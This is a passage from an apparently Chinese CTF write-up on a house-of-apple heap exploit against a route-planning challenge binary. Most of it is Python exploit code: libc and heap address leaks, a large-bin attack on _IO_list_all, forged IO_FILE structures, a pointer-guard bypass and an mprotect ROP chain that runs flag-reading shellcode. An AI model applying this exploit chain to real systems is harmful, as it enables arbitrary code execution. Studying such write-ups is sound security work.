data-num=\"59\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  v9<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> k <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>k <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    v6 <span class=\"token operator\">=</span> <span class=\"token function\">minDistance</span><span class=\"token punctuation\">(</span>v9<span class=\"token punctuation\">,</span> v10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    v10<span class=\"token punctuation\">[</span>v6<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> m <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> m <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>m <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v10<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v6 <span class=\"token operator\">+</span> m<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> v9<span class=\"token punctuation\">[</span>v6<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">9999</span> <span class=\"token operator\">&amp;&amp;</span> v9<span class=\"token punctuation\">[</span>v6<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v6 <span class=\"token operator\">+</span> m<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> v9<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        v9<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v9<span class=\"token punctuation\">[</span>v6<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> v11<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v6 <span class=\"token operator\">+</span> m<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Where do you want to travel?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  city_name <span class=\"token operator\">=</span> <span class=\"token function\">get_city_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"It is %dkm away from Guangzhou.\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v9<span class=\"token punctuation\">[</span>city_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v9<span class=\"token punctuation\">[</span>city_name<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">2000</span> <span class=\"token operator\">&amp;&amp;</span> v9<span class=\"token punctuation\">[</span>city_name<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">9999</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"That's so far! Please review and rewrite it!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token operator\">++</span>edit_flag2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  <span class=\"token keyword\">return</span> v12 <span class=\"token operator\">-</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>需要到 Guangzhou 的一条路径大于 2000 才能是的 edit_flag2 置 1</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># chunk0</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># chunk1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># chunk2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># chunk3</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Dijkstra<span class=\"token punctuation\">(</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-apple/image-20240830113533522.png\" alt=\"image-20240830113533522\"></p>\n<p>可以看到大于 2000，从而进入 edit_flag2++ 的分支</p>\n<p>通过此方式先将 edit_flag2 置 1，接下来去 free 在 add 泄露残留的指针</p>\n<hr>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># chunk0</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># chunk2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'train'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><img data-src=\"/img/house-of-apple/image-20240830113737005.png\" alt=\"image-20240830113737005\" style=\"zoom: 67%;\" />\n<p><img data-src=\"/img/house-of-apple/image-20240830113759781.png\" alt=\"image-20240830113759781\"></p>\n<p>将 chunk0 和 chunk2 置入 large bin，从而残留 fd 和 bk 指针，泄露 libc 和 heap</p>\n<hr>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1234'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'N'</span><span class=\"token operator\">*</span><span class=\"token number\">0x4ef</span><span class=\"token operator\">+</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libcbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x21b110</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'N'</span><span class=\"token operator\">*</span><span class=\"token number\">0x4f7</span><span class=\"token operator\">+</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>heapbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x001470</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-apple/image-20240830114122375.png\" alt=\"image-20240830114122375\"></p>\n<p>heap 同样，因为用 printf 泄露会被’\\x00’截断，释放之后再次写数据覆盖 libc 即可泄露</p>\n<p>清空 chunk，申请几个去泄露 libc 和 heap 地址</p>\n<hr>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>再次清空，准备进行 large bin attack 将 <code>fake_io_addr</code>  写入 io_list_all</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>target<span class=\"token operator\">=</span>libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_list_all'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fake_io_1_addr<span class=\"token operator\">=</span>heapbase<span class=\"token operator\">+</span><span class=\"token number\">0x1470</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>fake_io_2_addr<span class=\"token operator\">=</span>fake_io_1_addr<span class=\"token operator\">+</span><span class=\"token number\">0x100</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>_IO_wstrn_jumps <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x216dc0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>_IO_cookie_jumps <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x216b80</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>_lock <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span>  <span class=\"token number\">0x21ca60</span><span class=\"token comment\">#libc.sym._IO_stdfile_2_lock</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>point_guard_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x381770</span><span class=\"token comment\">#关闭 alse 情况下 0x381770</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>expected <span class=\"token operator\">=</span> fake_io_2_addr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>magic_gadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000167420</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>mov_rsp_rdx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x5a120</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>add_rsp_0x20_pop_rbx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xd2ba5</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x2a3e5</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>pop_rsi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x2be51</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>pop_rdx_rbx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x904a9</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>fake_io_1 <span class=\"token operator\">=</span> IO_FILE_plus_struct<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>fake_io_1<span class=\"token punctuation\">.</span>chain <span class=\"token operator\">=</span> fake_io_2_addr</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>fake_io_1<span class=\"token punctuation\">.</span>_flags2 <span class=\"token operator\">=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>fake_io_1<span class=\"token punctuation\">.</span>_mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>fake_io_1<span class=\"token punctuation\">.</span>_lock <span class=\"token operator\">=</span> _lock</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>fake_io_1<span class=\"token punctuation\">.</span>_wide_data <span class=\"token operator\">=</span> point_guard_addr</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>fake_io_1<span class=\"token punctuation\">.</span>vtable <span class=\"token operator\">=</span> _IO_wstrn_jumps</pre></td></tr><tr><td data-num=\"24\"></td><td><pre> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>fake_io_2 <span class=\"token operator\">=</span> IO_FILE_plus_struct<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>fake_io_2<span class=\"token punctuation\">.</span>_IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>fake_io_2<span class=\"token punctuation\">.</span>_IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>fake_io_2<span class=\"token punctuation\">.</span>_lock <span class=\"token operator\">=</span> _lock</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>fake_io_2<span class=\"token punctuation\">.</span>_mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>fake_io_2<span class=\"token punctuation\">.</span>_flags2 <span class=\"token operator\">=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>fake_io_2<span class=\"token punctuation\">.</span>vtable <span class=\"token operator\">=</span> _IO_cookie_jumps <span class=\"token operator\">+</span> <span class=\"token number\">0x58</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>data <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>fake_io_1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token number\">0xe0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>fake_io_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token number\">0xe0</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>fake_io_2_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span> rol<span class=\"token punctuation\">(</span>magic_gadget <span class=\"token operator\">^</span> expected<span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token number\">0x100</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            add_rsp_0x20_pop_rbx_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            fake_io_2_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            mov_rsp_rdx_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            pop_rdi_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            fake_io_2_addr <span class=\"token operator\">&amp;</span> <span class=\"token operator\">~</span><span class=\"token number\">0xfff</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            pop_rsi_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            <span class=\"token number\">0x4000</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            pop_rdx_rbx_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'mprotect'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            fake_io_2_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x200</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token number\">0x200</span><span class=\"token punctuation\">:</span> ShellcodeMall<span class=\"token punctuation\">.</span>amd64<span class=\"token punctuation\">.</span>cat_flag</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><hr>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span><span class=\"token comment\"># chunk0</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x521</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># chunk1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 通过 heaplist 残留指针使其再次可用，为 large bin attack 覆写 bk_nextsize 作准备</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'train'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># chunk2</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># chunk3</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># chunk2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>add chunk1 之前。</p>\n<p><img data-src=\"/img/house-of-apple/image-20240830114550286.png\" alt=\"image-20240830114550286\"></p>\n<p>add chunk2 之前</p>\n<p><img data-src=\"/img/house-of-apple/image-20240830114747677.png\" alt=\"image-20240830114747677\"></p>\n<p><img data-src=\"/img/house-of-apple/image-20240830114835438.png\" alt=\"image-20240830114835438\"></p>\n<p>我们将 <code>0x55555555d9b0</code>  此位置合理化了。能编辑路线 <code>changsha</code> ——&gt; <code>fuzhou</code></p>\n<p>将 